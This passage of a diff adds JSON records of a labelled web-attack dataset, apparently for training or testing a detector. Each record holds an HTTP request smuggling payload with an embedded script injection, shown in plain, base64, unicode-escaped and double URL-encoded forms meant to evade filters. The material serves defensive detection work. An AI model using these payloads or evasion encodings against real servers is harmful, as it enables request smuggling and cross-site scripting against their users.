+    "obfuscated_payload": "SEVBRCAvNDA0LyBIVFRQLzEuMVxyXG5Ib3N0OiB3d3cuZXhhbXBsZS5jb21cclxuXHJcbkdFVCAveD94PTxzY3JpcHQ-YWxlcnQoMSk8L3NjcmlwdD4gSFRUUC8xLjFcclxuWDogWQ==",
+    "obfuscation_chain": [
+      "base64_urlsafe"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode"
+    ],
+    "generation_seed": 64864067,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_hsmug_00028__obf03",
+    "payload": "HEAD \\u002f404/ HTTP/1.1\\u005cr\\u005cnHost\\u003a www.example.com\\r\\u005cn\\u005cr\\u005cnGET \\u002fx?x=<script\\u003ealert\\u00281)</script\\u003e HTTP/1.1\\r\\u005cnX: Y",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00028",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "c96a714464917ba94ec636b79f25e538a13bcb0ea79b52c58d1f9e30d63edcd2",
+    "original_id": "raw_hsmug_00028",
+    "original_payload": "HEAD /404/ HTTP/1.1\\r\\nHost: www.example.com\\r\\n\\r\\nGET /x?x=<script>alert(1)</script> HTTP/1.1\\r\\nX: Y",
+    "obfuscated_payload": "HEAD \\u002f404/ HTTP/1.1\\u005cr\\u005cnHost\\u003a www.example.com\\r\\u005cn\\u005cr\\u005cnGET \\u002fx?x=<script\\u003ealert\\u00281)</script\\u003e HTTP/1.1\\r\\u005cnX: Y",
+    "obfuscation_chain": [
+      "unicode_escape_punctuation"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific_fallback",
+    "decoder_requirements": [
+      "unicode_escape_decode"
+    ],
+    "generation_seed": 64865076,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_hsmug_00028__obf04",
+    "payload": "HEAD%2520%252F404%252F%2520HTTP%252F1.1%255Cr%255CnHost%253A%2520www.example.com%255Cr%255Cn%255Cr%255CnGET%2520%252Fx%253Fx%253D%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E%2520HTTP%252F1.1%255Cr%255CnX%253A%2520Y",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00028",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "c96a714464917ba94ec636b79f25e538a13bcb0ea79b52c58d1f9e30d63edcd2",
+    "original_id": "raw_hsmug_00028",
+    "original_payload": "HEAD /404/ HTTP/1.1\\r\\nHost: www.example.com\\r\\n\\r\\nGET /x?x=<script>alert(1)</script> HTTP/1.1\\r\\nX: Y",
+    "obfuscated_payload": "HEAD%2520%252F404%252F%2520HTTP%252F1.1%255Cr%255CnHost%253A%2520www.example.com%255Cr%255Cn%255Cr%255CnGET%2520%252Fx%253Fx%253D%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E%2520HTTP%252F1.1%255Cr%255CnX%253A%2520Y",
+    "obfuscation_chain": [
+      "double_url_encode"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode_twice"
+    ],
+    "generation_seed": 64866085,
+    "equivalence_scope": "normalization-layer-dependent"
+  }
+]
